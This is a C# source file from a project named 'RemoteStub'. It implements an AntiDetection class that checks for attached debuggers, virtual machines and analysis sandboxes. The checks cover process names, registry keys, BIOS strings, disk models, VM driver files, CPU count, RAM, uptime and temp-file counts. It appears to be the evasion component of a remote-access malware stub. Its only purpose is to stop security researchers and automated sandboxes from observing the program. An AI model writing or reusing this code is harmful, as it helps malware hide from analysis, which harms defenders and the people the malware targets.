using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace RemoteStub
{
    /// <summary>
    /// Advanced anti-VM and anti-debugging detection
    /// </summary>
    public static class AntiDetection
    {
        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        /// <summary>
        /// Check if running in virtual machine
        /// </summary>
        public static bool IsVirtualMachine()
        {
            try
            {
                // Check 1: VM processes
                var vmProcesses = new[] { "vmware", "vbox", "qemu", "xen", "vmtoolsd", "vmsrvc", "vmusrvc" };
                var processes = Process.GetProcesses().Select(p => p.ProcessName.ToLower()).ToList();
                
                if (vmProcesses.Any(vm => processes.Any(p => p.Contains(vm))))
                    return true;

                // Check 2: VM registry keys
                if (CheckVMRegistry())
                    return true;

                // Check 3: VM hardware
                if (CheckVMHardware())
                    return true;

                // Check 4: VM files
                if (CheckVMFiles())
                    return true;

                return false;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Check if debugger is attached
        /// </summary>
        public static bool IsDebuggerAttached()
        {
            try
            {
                // Check 1: IsDebuggerPresent
                if (IsDebuggerPresent())
                    return true;

                // Check 2: CheckRemoteDebuggerPresent
                bool isDebuggerPresent = false;
                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                if (isDebuggerPresent)
                    return true;

                // Check 3: Debugger.IsAttached
                if (Debugger.IsAttached)
                    return true;

                return false;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Check if running in sandbox
        /// </summary>
        public static bool IsSandbox()
        {
            try
            {
                // Check 1: Low CPU count (sandboxes often have 1-2 cores)
                if (Environment.ProcessorCount < 2)
                    return true;

                // Check 2: Low RAM (sandboxes often have < 4GB)
                var ramGB = GetTotalRAM() / (1024.0 * 1024.0 * 1024.0);
                if (ramGB < 4)
                    return true;

                // Check 3: Uptime (sandboxes are often freshly booted)
                var uptime = TimeSpan.FromMilliseconds(Environment.TickCount64);
                if (uptime.TotalMinutes < 10)
                    return true;

                // Check 4: Temp files (sandboxes have few temp files)
                var tempFiles = Directory.GetFiles(Path.GetTempPath());
                if (tempFiles.Length < 20)
                    return true;

                return false;
            }
            catch
            {
                return false;
            }
        }

        private static bool CheckVMRegistry()
        {
            try
            {
                var vmKeys = new[]
                {
                    @"SOFTWARE\VMware, Inc.\VMware Tools",
                    @"SOFTWARE\Oracle\VirtualBox Guest Additions",
                    @"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0"
                };

                foreach (var keyPath in vmKeys)
                {
                    using var key = Registry.LocalMachine.OpenSubKey(keyPath);
                    if (key != null)
                        return true;
                }

                // Check for VM identifiers in BIOS
                using var biosKey = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS");
                if (biosKey != null)
                {
                    var manufacturer = biosKey.GetValue("SystemManufacturer")?.ToString()?.ToLower() ?? "";
                    var product = biosKey.GetValue("SystemProductName")?.ToString()?.ToLower() ?? "";
                    
                    var vmStrings = new[] { "vmware", "virtualbox", "qemu", "xen", "virtual", "kvm" };
                    if (vmStrings.Any(vm => manufacturer.Contains(vm) || product.Contains(vm)))
                        return true;
                }

                return false;
            }
            catch
            {
                return false;
            }
        }

        private static bool CheckVMHardware()
        {
            try
            {
                // Check disk model
                using var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
                foreach (ManagementObject disk in searcher.Get())
                {
                    var model = disk["Model"]?.ToString()?.ToLower() ?? "";
                    var vmStrings = new[] { "vbox", "vmware", "qemu", "virtual" };
                    
                    if (vmStrings.Any(vm => model.Contains(vm)))
                        return true;
                }

                return false;
            }
            catch
            {
                return false;
            }
        }

        private static bool CheckVMFiles()
        {
            try
            {
                var vmFiles = new[]
                {
                    @"C:\windows\system32\drivers\vmmouse.sys",
                    @"C:\windows\system32\drivers\vmhgfs.sys",
                    @"C:\windows\system32\drivers\VBoxMouse.sys",
                    @"C:\windows\system32\drivers\VBoxGuest.sys",
                    @"C:\windows\system32\vboxdisp.dll",
                    @"C:\windows\system32\vboxhook.dll",
                    @"C:\windows\system32\vboxogl.dll"
                };

                return vmFiles.Any(File.Exists);
            }
            catch
            {
                return false;
            }
        }

        private static ulong GetTotalRAM()
        {
            try
            {
                using var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
                foreach (ManagementObject obj in searcher.Get())
                {
                    return Convert.ToUInt64(obj["TotalPhysicalMemory"]);
                }
                return 0;
            }
            catch
            {
                return 0;
            }
        }
    }
}
